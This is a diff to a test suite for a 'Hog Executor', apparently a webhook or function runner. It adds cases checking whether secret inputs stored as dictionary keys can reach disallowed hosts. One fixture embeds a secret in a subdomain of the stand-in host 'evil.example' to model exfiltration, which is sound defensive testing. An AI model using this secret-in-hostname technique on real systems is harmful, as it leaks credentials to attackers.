@@ -1838,6 +1838,8 @@ describe('Hog Executor', () => {
                 | 'standard_webhooks'
                 | 'body_beside_bound_secret'
                 | 'dictionary_entry'
+                | 'dictionary_key'
+                | 'paired_dictionary_key'
                 | 'plain_value_of_dictionary_entry'
                 | 'hardcoded_value_of_dictionary_entry'
                 | 'mapping_value_of_dictionary_entry'
@@ -1897,6 +1899,21 @@ describe('Hog Executor', () => {
                     dictionary_entry: {
                         params: { body: JSON.stringify({ token: secret }) },
                         inputs: { api_key: { 'Content-Type': 'application/json', Authorization: secret } },
+                    },
+                    dictionary_key: {
+                        params: { body: JSON.stringify({ [secret]: true }) },
+                        inputs: { api_key: { [secret]: 'on' } },
+                    },
+                    // The editor lists the keys of a `secret_<key>` dictionary paired with a plain `<key>` dictionary.
+                    paired_dictionary_key: {
+                        params: { headers: { 'X-Partner-Token': 'public' } },
+                        inputs: { secret_headers: { 'X-Partner-Token': 'on' } },
+                        hogFunction: {
+                            inputs_schema: [
+                                { type: 'dictionary', key: 'headers' },
+                                { type: 'dictionary', key: 'secret_headers', secret: true },
+                            ],
+                        },
                     },
                     plain_value_of_dictionary_entry: {
                         params: { headers: { 'Content-Type': 'application/json' } },
@@ -2056,6 +2073,18 @@ describe('Hog Executor', () => {
                     sent: false,
                 },
                 {
+                    case: 'a mismatched secret dictionary key',
+                    allowed: ['https://elsewhere.example'],
+                    carry: 'dictionary_key',
+                    sent: false,
+                },
+                {
+                    case: 'a key of a paired secret dictionary, which the editor shows',
+                    allowed: ['https://elsewhere.example'],
+                    carry: 'paired_dictionary_key',
+                    sent: true,
+                },
+                {
                     case: 'a dictionary entry whose value the function also holds in plain inputs',
                     allowed: ['https://elsewhere.example'],
                     carry: 'plain_value_of_dictionary_entry',
@@ -2158,6 +2187,13 @@ describe('Hog Executor', () => {
                     url: 'https://good.example/',
                     headers: { Host: `${HOST_SECRET}.evil.example` },
                     carry: 'body',
+                    secret: HOST_SECRET,
+                },
+                {
+                    carriedBy: 'the URL as a secret dictionary key',
+                    url: `https://${HOST_SECRET}.evil.example/`,
+                    headers: {},
+                    carry: 'dictionary_key',
                     secret: HOST_SECRET,
                 },
                 {
